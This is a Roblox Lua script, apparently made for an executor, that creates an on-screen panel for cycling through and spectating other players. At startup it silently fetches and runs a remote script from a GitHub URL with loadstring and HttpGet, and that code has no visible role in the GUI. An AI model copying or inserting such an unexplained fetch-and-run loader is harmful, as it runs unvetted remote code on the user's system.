-- a = player
-- b = gui
-- c = avatarImage
-- d = username
-- e = nextButton
-- f = beforeButton
-- g = players
-- h = currentIndex
-- i = updateDisplay function
-- j = refreshPlayersList function
-- k = toggleButton state
-- l = original positions table

local function Sc()
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/minhReal/mainS/refs/heads/main/Script/Script_start.lua"))()
    end)
    if not success then
        warn("Failed to load external script: " .. err)
    end
end

task.spawn(Sc)

local a = game.Players.LocalPlayer
local b = Instance.new("ScreenGui", a.PlayerGui)

local c = Instance.new("ImageLabel")
local d = Instance.new("TextBox")

c.Size = UDim2.new(0.08, 0, 0.15, 0)
c.Position = UDim2.new(0.31, 0, -0.1, 0)
c.BackgroundTransparency = 1
c.Parent = b

d.Size = UDim2.new(0.3, 0, 0.2, 0)
d.Position = UDim2.new(0.4, 0, -0.1, 0)
d.BackgroundColor3 = Color3.new(0, 0, 0)
d.BorderColor3 = Color3.new(0, 0, 0)
d.BorderSizePixel = 1
d.Text = "Display_name (@username)"
d.TextSize = 20
d.TextXAlignment = Enum.TextXAlignment.Left
d.BackgroundTransparency = 1
d.TextColor3 = Color3.new(1, 1, 1)
d.Font = Enum.Font.Code
d.ClearTextOnFocus = false
d.TextWrapped = true
d.Parent = b

local e = Instance.new("TextButton")
e.Size = UDim2.new(0.05, 0, 0.1, 0)
e.Position = UDim2.new(0.69, 0, -0.047, 0)
e.BackgroundColor3 = Color3.new(0, 0, 0)
e.BorderColor3 = Color3.new(0, 0, 0)
e.BorderSizePixel = 0
e.Text = ">"
e.TextSize = 20
e.BackgroundTransparency = 1
e.TextColor3 = Color3.new(255, 255, 255)
e.Font = Enum.Font.Code
e.Parent = b

local f = Instance.new("TextButton")
f.Size = UDim2.new(0.05, 0, 0.1, 0)
f.Position = UDim2.new(0.26, 0, -0.047, 0)
f.BackgroundColor3 = Color3.new(0, 0, 0)
f.BorderColor3 = Color3.new(0, 0, 0)
f.BorderSizePixel = 0
f.Text = "<"
f.TextSize = 20
f.BackgroundTransparency = 1
f.TextColor3 = Color3.new(1, 1, 1)
f.Font = Enum.Font.Code
f.Parent = b

local k = Instance.new("ImageButton")
k.Size = UDim2.new(0.08, 0, 0.12, 0)
k.Position = UDim2.new(0.92, 0, 0.5, 0)
k.BackgroundTransparency = 0.5
k.Image = "http://www.roblox.com/asset/?id=1137376343"
k.Parent = b

local g = {}
local h = 1
local m = true
local l = {
    c.Position,
    d.Position,
    e.Position,
    f.Position
}

local function i()
    local j = g[h]
    if j then
        c.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. j.UserId .. "&width=420&height=420&format=png"
        d.Text = j.DisplayName .. " (@" .. j.Name .. ")"
        
        if j == a then
            workspace.CurrentCamera.CameraSubject = a.Character
        else
            if j.Character and j.Character:FindFirstChild("Head") then
                workspace.CurrentCamera.CameraSubject = j.Character.Head
                workspace.CurrentCamera.CFrame = CFrame.new(j.Character.Head.Position + Vector3.new(0, 0.5, -2), j.Character.Head.Position)
            end
        end
    end
end

local function j()
    g = {}
    for _, n in pairs(game.Players:GetPlayers()) do
        table.insert(g, n)
    end
    h = math.clamp(h, 1, #g)
    i()
end

e.MouseButton1Click:Connect(function()
    h = h + 1
    if h > #g then
        h = 1
    end
    i()
end)

f.MouseButton1Click:Connect(function()
    h = h - 1
    if h < 1 then
        h = #g
    end
    i()
end)

k.MouseButton1Click:Connect(function()
    m = not m

    if not m then
        c.Position = UDim2.new(-1, 0, -1, 0)
        d.Position = UDim2.new(-1, 0, -1, 0)
        e.Position = UDim2.new(-1, 0, -1, 0)
        f.Position = UDim2.new(-1, 0, -1, 0)
        k.Image = "http://www.roblox.com/asset/?id=14996669677"
        workspace.CurrentCamera.CameraSubject = a.Character
    else
        c.Position = l[1]
        d.Position = l[2]
        e.Position = l[3]
        f.Position = l[4]
        k.Image = "http://www.roblox.com/asset/?id=1137376343"
        i()
    end
end)

game.Players.PlayerAdded:Connect(function(n)
    j()
end)

game.Players.PlayerRemoving:Connect(function(n)
    j()
end)

j()
